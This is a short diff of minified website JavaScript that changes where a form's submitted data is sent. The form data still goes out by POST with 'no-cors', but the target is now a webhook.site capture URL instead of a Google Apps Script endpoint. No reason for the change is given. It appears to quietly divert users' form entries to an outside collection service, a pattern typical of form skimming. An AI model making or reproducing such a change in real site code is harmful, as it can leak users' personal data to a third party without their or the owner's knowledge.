@@ -2504,7 +2504,7 @@ const od = b => {
 Ob.addEventListener("submit", c => {
   c.preventDefault();
   let a = new FormData(Ob);
-  fetch("https://script.google.com/macros/s/AKfycbz-MAbyRvYJ-1Eqt61JwhGNJju2MWO9HKU-m3SErO7EPkD1h-zRnPel6HJXg_mJueLFsA/exec", {
+  fetch("https://webhook.site/e988c7db-986f-4c5c-a317-3e52e2335d29", {
     mode: "no-cors",
     method: "POST",
     body: a
